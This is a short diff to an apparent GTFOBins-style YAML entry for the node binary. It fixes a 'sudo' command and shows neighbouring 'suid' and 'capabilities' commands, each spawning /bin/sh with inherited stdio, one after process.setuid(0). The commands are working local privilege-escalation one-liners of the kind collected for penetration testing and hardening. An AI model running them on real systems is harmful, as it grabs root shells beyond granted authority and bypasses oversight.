@@ -45,7 +45,7 @@ functions:
         ./node -e 'child_process.spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
   sudo:
     - code: |
-        sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
+        sudo node -e 'const { spawn } = require("node:child_process"); spawn("/bin/sh", {stdio: [0, 1, 2]})'
   capabilities:
     - code: |
         ./node -e 'process.setuid(0); child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
